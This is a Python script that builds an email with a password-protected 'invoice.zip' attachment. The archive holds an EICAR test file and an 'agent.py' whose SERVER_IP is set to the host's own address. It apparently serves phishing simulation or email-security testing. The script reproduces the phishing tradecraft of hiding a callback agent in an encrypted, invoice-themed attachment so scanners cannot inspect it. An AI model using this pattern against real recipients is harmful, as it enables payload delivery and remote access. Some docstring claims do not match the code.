#!/usr/bin/env python3
"""
Builds a password-protected ZIP with email.eml + eicar.txt + agent.py (AES if
pyzipper is available) and injects its Base64 into shell/email.eml by
replacing placeholder 'XXX'. Also updates shell/agent.py: sets SERVER_IP
constant to the current host's primary IPv4.

Steps:
 0) Create encrypted invoice.zip (password: infected) using pure-Python
    zip library (pyzipper AES-256). If pyzipper отсутствует — завершаем
    с ошибкой (без небезопасных fallback’ов).
 1) Base64-encode invoice.zip with 76-char MIME line wrap (CRLF)
 2) Replace placeholder 'XXX' in email.eml with the Base64 string
 3) Detect host IP and write it into agent.py (SERVER_IP = "<ip>")

Notes:
 - Creates a backup of email.eml as email.eml.bak before modifying.
 - Creates/updates agent.py in the same folder; makes a backup agent.py.bak.
"""

from __future__ import annotations

import base64
import os
import shutil
import subprocess
import sys
from pathlib import Path
import re
import socket

PASSWORD = "infected"
# Support ASCII 'XXX' and Cyrillic 'ХХХ' placeholders
PLACEHOLDERS = ("XXX", "ХХХ")


def ensure_eicar(path: Path) -> None:
    if path.exists():
        return
    # Standard EICAR test string (harmless)
    eicar = "X#5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n".replace("#", "")
    path.write_text(eicar, encoding="ascii")


def create_encrypted_zip(basedir: Path, zip_path: Path, files: list[Path]) -> None:
    """Create encrypted ZIP using pyzipper AES if available.
    If pyzipper is not installed and ALLOW_PLAIN=1, create a plain ZIP.
    Otherwise raise RuntimeError with install hint.
    """
    try:
        import pyzipper  # type: ignore
    except ModuleNotFoundError:
        raise RuntimeError("pyzipper not installed; cannot create encrypted ZIP. Install with 'pip install pyzipper'.")

    with pyzipper.AESZipFile(zip_path, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(PASSWORD.encode("utf-8"))
        for f in files:
            zf.write(basedir / f.name, arcname=f.name)
    return

def verify_encrypted(zip_path: Path) -> None:
    """Verify the archive is password-protected with PASSWORD.
    Tries to read an entry with a wrong password (must fail), then with
    the correct password (must succeed)."""
    import pyzipper  # type: ignore
    with pyzipper.AESZipFile(zip_path, "r") as zf:
        # pick first file
        names = zf.namelist()
        if not names:
            raise RuntimeError("ZIP is empty")
        name = names[0]
        # wrong password should fail
        zf.setpassword(b"wrong-password")
        failed = False
        try:
            _ = zf.read(name)
        except Exception:
            failed = True
        if not failed:
            raise RuntimeError("ZIP is not password-protected as expected")
        # correct password should succeed
        zf.setpassword(PASSWORD.encode("utf-8"))
        _ = zf.read(name)


def b64_wrap_crlf(data: bytes, width: int = 76) -> str:
    s = base64.b64encode(data).decode("ascii")
    # wrap at width with CRLF
    lines = [s[i : i + width] for i in range(0, len(s), width)]
    return "\r\n".join(lines)


def inject_base64(eml_path: Path, b64_text: str) -> None:
    raw = eml_path.read_text(encoding="utf-8", errors="replace")
    chosen = None
    for ph in PLACEHOLDERS:
        if ph in raw:
            chosen = ph
            break
    if not chosen:
        raise RuntimeError(
            f"Placeholder not found in {eml_path} (tried: {', '.join(PLACEHOLDERS)})"
        )
    backup = eml_path.with_suffix(eml_path.suffix + ".bak")
    if not backup.exists():
        backup.write_text(raw, encoding="utf-8", errors="ignore")
    # Replace all occurrences (usually one)
    updated = raw.replace(chosen, b64_text)
    # Normalize line endings and collapse extra blank lines; ensure CRLF
    updated = _normalize_eml_text(updated)
    eml_path.write_text(updated, encoding="utf-8", newline="")


def _normalize_eml_text(s: str) -> str:
    """Normalize messy CR/LF to CRLF and collapse extra blank lines.
    - Convert any CRLF/CR to LF
    - Collapse 3+ consecutive newlines to 2
    - Trim trailing spaces before newline
    - Convert back to CRLF
    """
    s = s.replace("\r\n", "\n").replace("\r", "\n")
    s = re.sub(r"[ \t]+\n", "\n", s)
    s = re.sub(r"\n{3,}", "\n\n", s)
    return s.replace("\n", "\r\n")


def get_primary_ip() -> str:
    # Determine primary IPv4 by opening a UDP socket to a public IP (no packets sent)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def update_agent_ip(agent_path: Path, ip: str) -> None:
    if not agent_path.exists():
        return
    txt = agent_path.read_text(encoding="utf-8", errors="replace")
    backup = agent_path.with_suffix(agent_path.suffix + ".bak")
    if not backup.exists():
        backup.write_text(txt, encoding="utf-8", errors="ignore")
    # Replace line like: SERVER_IP = "..." or SERVER_IP='...' (preserve trailing comments)
    pattern = re.compile(r"^(?P<prefix>\s*SERVER_IP\s*=\s*)(['\"]).*?\2(?P<suffix>.*)$", re.MULTILINE)
    def _repl(m: re.Match[str]) -> str:
        return f"{m.group('prefix')}\"{ip}\"{m.group('suffix')}"
    new_txt, n = pattern.subn(_repl, txt)
    if n == 0:
        # if not found, try to inject near top (after shebang/docstring)
        lines = txt.splitlines()
        insert_at = 0
        lines.insert(insert_at, f'SERVER_IP = "{ip}"')
        new_txt = "\n".join(lines)
    agent_path.write_text(new_txt, encoding="utf-8")


def main() -> int:
    here = Path(__file__).resolve().parent
    eml = here / "email.eml"
    eicar = here / "eicar.txt"
    agent = here / "agent.py"
    zipf = here / "invoice.zip"

    if not eml.exists():
        print(f"Error: {eml} not found", file=sys.stderr)
        return 1

    ensure_eicar(eicar)

    try:
        if zipf.exists():
            zipf.unlink()
        create_encrypted_zip(here, zipf, [eicar, agent])
    except subprocess.CalledProcessError as e:
        print(f"Error creating encrypted zip via 7z: {e}", file=sys.stderr)
        return 3
    except RuntimeError as e:
        print(str(e), file=sys.stderr)
        return 3

    # Verify encryption really applied
    try:
        verify_encrypted(zipf)
    except Exception as e:
        print(f"Encryption verification failed: {e}", file=sys.stderr)
        return 3

    data = zipf.read_bytes()
    b64 = b64_wrap_crlf(data)

    try:
        inject_base64(eml, b64)
    except Exception as e:
        print(f"Error injecting Base64 into {eml}: {e}", file=sys.stderr)
        return 4

    # Update agent.py with current host IP
    try:
        ip = get_primary_ip()
        update_agent_ip(agent, ip)
    except Exception as e:
        print(f"Warning: could not update agent.py SERVER_IP: {e}", file=sys.stderr)

    print(f"Created {zipf.name} (encrypted), injected Base64 into {eml.name}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
